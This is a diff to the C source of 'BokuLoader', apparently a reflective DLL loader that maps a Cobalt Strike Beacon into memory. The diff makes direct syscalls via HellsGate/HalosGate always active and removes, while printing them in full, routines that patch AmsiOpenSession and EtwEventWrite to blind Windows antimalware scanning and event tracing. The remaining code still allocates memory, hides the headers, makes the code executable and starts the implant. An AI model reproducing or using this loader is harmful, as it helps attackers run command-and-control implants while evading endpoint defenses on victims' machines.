@@ -1,10 +1,4 @@
 #define WIN32_LEAN_AND_MEAN
-
-/* Uncomment to enable features */
-//#define BYPASS       // ETW & AMSI bypass switch. Comment out this line to disable
-//#define SYSCALLS     // Use direct syscalls with HellGate & HalosGate instead of WINAPIs
-/********************************/
-
 #include <windows.h>
 
 typedef struct Export {
@@ -66,29 +60,23 @@ PVOID   getBeaconEntryPoint(PVOID newRdllAddr, PVOID OptionalHeaderAddr);
 PVOID   getRip(VOID);
 ULONG32 copyWithDelimiter(PVOID dst, PVOID src, ULONG32 n, CHAR delimiter);
 
-#ifdef SYSCALLS
 DWORD findSyscallNumber(PVOID ntdllApiAddr);
 DWORD HellsGate(DWORD wSystemCall);
 VOID  HellDescent(VOID);
 DWORD halosGateDown(PVOID ntdllApiAddr, DWORD index);
 DWORD halosGateUp(PVOID ntdllApiAddr, DWORD index);
 DWORD getSyscallNumber(PVOID functionAddress);
-#endif
 
 typedef PVOID  (WINAPI * tLoadLibraryA)  (LPCSTR);
 
 typedef LONG32 (NTAPI  * tNtProt)        (HANDLE, PVOID, PVOID, ULONG32, PVOID);
 typedef LONG32 (NTAPI  * tNtAlloc)       (HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 typedef LONG32 (NTAPI  * tNtFlush)       (HANDLE, PVOID, ULONG32);
-#ifdef FREE_HEADERS
 typedef LONG32 (NTAPI  * tNtFree)        (HANDLE, PVOID, PSIZE_T, ULONG);
-#endif
 
 typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, ULONG32, PVOID);
 
-#ifdef BYPASS
 void  bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtectVirtualMemory);
-#endif
 
 #define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
 
@@ -155,47 +143,28 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
     tNtProt pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);
 
-    #ifdef FREE_HEADERS
     char ntstr4[] = {'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
     tNtFree pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);
-    #endif
-
-    // AMSI & ETW Optional Bypass
-    #ifdef BYPASS
-    bypass(&ntdll, &k32, pLoadLibraryA, pNtProtectVirtualMemory);
-    #endif
 
     // Allocate new memory to write our new RDLL too
     Dll rdll_dst;
     rdll_dst.dllBase = NULL;
     base = NULL;
     size = rdll_src.size;
-    #ifdef SYSCALLS
     HellsGate(getSyscallNumber(pNtAllocateVirtualMemory));
     status = ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
-    #else
-    status = pNtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
-    #endif
     if (!NT_SUCCESS(status))
         return NULL;
 
     rdll_dst.dllBase = base;
 
-    #ifdef FREE_HEADERS
     // Deallocate the first memory page (4096/0x1000 bytes)
     base = rdll_dst.dllBase;
     size = 4096;
     //size = rdll_src.SizeOfHeaders;
-    #ifdef SYSCALLS
     HellsGate(getSyscallNumber(pNtFreeVirtualMemory));
     status = ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
-    #else
-    status = pNtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_RELEASE);
-    #endif
-    #elif !defined(STOMP_HEADERS)
-    Memcpy(rdll_dst.dllBase, rdll_src.dllBase, rdll_src.SizeOfHeaders);
-    #endif
-
+  
     // Save .text section address and size for destination RDLL so we can make it RE later
     BOOL textSectionFlag = FALSE;
     rdll_dst.TextSection = NULL;
@@ -502,12 +471,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     ULONG32 oldprotect = 0;
     base = rdll_dst.TextSection;
     size = rdll_dst.TextSectionSize;
-    #ifdef USE_RWX
-    ULONG32 newprotect = PAGE_EXECUTE_READWRITE;
-    #else
     ULONG32 newprotect = PAGE_EXECUTE_READ;
-    #endif
-    #ifdef SYSCALLS
     HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
     status = ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
     if (!NT_SUCCESS(status))
@@ -517,15 +481,6 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     status = ((tNtFlush)HellDescent)(NtCurrentProcess(), NULL, 0);
     if (!NT_SUCCESS(status))
         return NULL;
-    #else
-    status = pNtProtectVirtualMemory(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
-    if (!NT_SUCCESS(status))
-        return NULL;
-
-    status = pNtFlushInstructionCache(NtCurrentProcess(), NULL, 0);
-    if (!NT_SUCCESS(status))
-        return NULL;
-    #endif
 
     rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
     ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
@@ -637,101 +592,6 @@ PVOID xGetProcAddress(PVOID symbolStr, PDll dll)
 
     return address;
 }
-
-#ifdef BYPASS
-void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtectVirtualMemory){
-    LONG32 status;
-    PVOID Base;
-    SIZE_T Size;
-    unsigned long oldprotect;
-
-    // ######### AMSI.AmsiOpenSession Bypass
-    char as[] = {'a','m','s','i','.','d','l','l',0};
-    Dll amsi;
-    amsi.dllBase = getDllBase(as); // check if amsi.dll is already loaded into the process
-    if (amsi.dllBase == NULL){ // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
-        amsi.dllBase = pLoadLibraryA(as);
-    }
-
-    if (amsi.dllBase != NULL) {
-        amsi.Export.Directory     = getExportDirectory(amsi.dllBase);
-        amsi.Export.AddressTable  = getExportAddressTable(amsi.dllBase, amsi.Export.Directory);
-        amsi.Export.NameTable     = getExportNameTable(amsi.dllBase, amsi.Export.Directory);
-        amsi.Export.OrdinalTable  = getExportOrdinalTable(amsi.dllBase, amsi.Export.Directory);
-        amsi.Export.NumberOfNames = getNumberOfNames(amsi.Export.Directory);
-        char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
-        void* pAmsiOpenSession  = xGetProcAddress(aoses, &amsi);
-        if (pAmsiOpenSession) {
-
-            unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
-            Base = pAmsiOpenSession;
-            Size = sizeof(amsibypass);
-
-            #ifdef SYSCALLS
-            // make memory region RWX
-            HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
-            status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
-            if (!NT_SUCCESS(status))
-                return;
-            // write the bypass
-            Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
-            // make memory region RX again
-            HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
-            status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
-            if (!NT_SUCCESS(status))
-                return;
-            #else
-            // make memory region RWX
-            status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
-            if (!NT_SUCCESS(status))
-                return;
-            // write the bypass
-            Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
-            // make memory region RX again
-            status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
-            if (!NT_SUCCESS(status))
-                return;
-            #endif
-        }
-    }
-
-    // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
-    char eew[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
-    void* pEtwEventWrite  = xGetProcAddress(eew, ntdll);
-
-    if (pEtwEventWrite != NULL) {
-        unsigned char etwbypass[] = { 0xc3 }; // ret
-        Base = pEtwEventWrite;
-        Size = sizeof(etwbypass);
-        #ifdef SYSCALLS
-        // make memory region RWX
-        HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
-        status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
-        if (!NT_SUCCESS(status))
-            return;
-        // write the bypass
-        Memcpy(pEtwEventWrite, etwbypass, sizeof(etwbypass));
-        // make memory region RX again
-        HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
-        status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
-        if (!NT_SUCCESS(status))
-            return;
-        #else
-        // make memory region RWX
-        status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
-        if (!NT_SUCCESS(status))
-            return;
-        // write the bypass
-        Memcpy(pEtwEventWrite, etwbypass, sizeof(etwbypass));
-        // make memory region RX again
-        status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
-        if (!NT_SUCCESS(status))
-            return;
-        #endif
-    }
-    return;
-}
-#endif
 
 __asm__(
 "getRip: \n"
@@ -960,10 +820,7 @@ __asm__(
     "jmp copyLoop \n"
     "copydone: \n"
     "ret \n"
-);
 
-#ifdef SYSCALLS
-__asm__(
 "getSyscallNumber: \n"
     "push rcx \n"
     "call findSyscallNumber \n"     // try to read the syscall directly
@@ -1048,4 +905,3 @@ __asm__(
     "syscall \n"
     "ret \n"
 );
-#endif
